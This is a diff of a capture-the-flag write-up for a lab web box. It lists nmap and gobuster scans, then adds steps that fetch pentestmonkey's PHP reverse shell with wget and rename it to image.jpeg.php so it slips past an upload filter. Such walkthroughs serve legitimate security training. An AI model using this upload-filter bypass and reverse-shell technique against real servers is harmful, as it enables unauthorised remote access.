@@ -16,7 +16,7 @@ description: Web
 nmap -sC -sV -T5 -p1-65535 10.10.243.219
 ```
 
-![](../.gitbook/assets/image%20%28362%29.png)
+![](../.gitbook/assets/image%20%28363%29.png)
 
 {% hint style="success" %}
 80, 65000
@@ -28,7 +28,7 @@ nmap -sC -sV -T5 -p1-65535 10.10.243.219
 gobuster dir -u http://10.10.243.219 -w /usr/share/dirb/wordlists/common.txt
 ```
 
-![](../.gitbook/assets/image%20%28364%29.png)
+![](../.gitbook/assets/image%20%28365%29.png)
 
 ```text
 gobuster dir -u http://10.10.243.219:65000 -w /usr/share/dirb/wordlists/common.txt -x php -t 50
@@ -61,6 +61,14 @@ grid
 {% endhint %}
 
 ### Bypass the filters. Upload and execute a reverse shell. 
+
+```text
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+mv php-reverse-shell.php image.jpeg.php
+```
+
+![](../.gitbook/assets/image%20%28362%29.png)
 
 {% hint style="success" %}
 
